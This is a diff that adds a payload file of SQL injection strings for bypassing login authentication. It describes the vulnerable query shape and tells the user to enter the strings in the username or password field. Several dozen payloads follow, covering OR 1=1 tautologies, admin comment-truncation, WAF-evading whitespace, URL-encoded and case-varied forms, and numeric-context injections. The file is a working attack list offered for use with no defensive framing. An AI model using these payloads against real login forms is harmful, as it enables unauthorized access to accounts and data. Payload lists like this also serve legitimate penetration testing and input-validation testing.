@@ -1,0 +1,64 @@
+# ============================================================
+# SQL Injection Payloads - Authentication Bypass
+# ============================================================
+# Target: Login forms that build queries like:
+#   SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
+#
+# Usage: Enter these as the username and/or password field.
+# ============================================================
+
+# --- Basic OR-based bypass ---
+# Closes the quote, injects OR 1=1 (always true), comments out the rest
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1" --
+" OR "1"="1" #
+
+# --- Admin-targeted bypass ---
+# Logs in as admin by terminating the query after the username
+admin' --
+admin' #
+admin'/*
+admin' OR '1'='1
+admin' OR '1'='1' --
+admin' OR '1'='1' #
+admin') OR ('1'='1
+admin') OR ('1'='1' --
+
+# --- Password field bypass ---
+# Use any username; put these in the password field
+' OR 1=1 --
+' OR 1=1 #
+') OR ('1'='1
+') OR ('1'='1' --
+
+# --- Bypassing with whitespace/comment variants ---
+# Some WAFs filter common patterns; these use alternate whitespace
+'/**/OR/**/1=1--
+'%09OR%091=1--
+' OR 1=1--
+
+# --- Double encoding (URL-encoded for web forms) ---
+%27%20OR%20%271%27%3D%271
+%27%20OR%20%271%27%3D%271%27%20--
+
+# --- Case manipulation ---
+' oR '1'='1
+' Or '1'='1' --
+' OR '1'='1' --
+
+# --- NULL-based bypass ---
+' OR ''='
+' OR ''='' --
+" OR ""="
+" OR ""="" --
+
+# --- Numeric context (no quotes needed) ---
+# For queries like: WHERE id=INPUT
+1 OR 1=1
+1 OR 1=1 --
+1 OR 1=1#
+0 OR 1=1
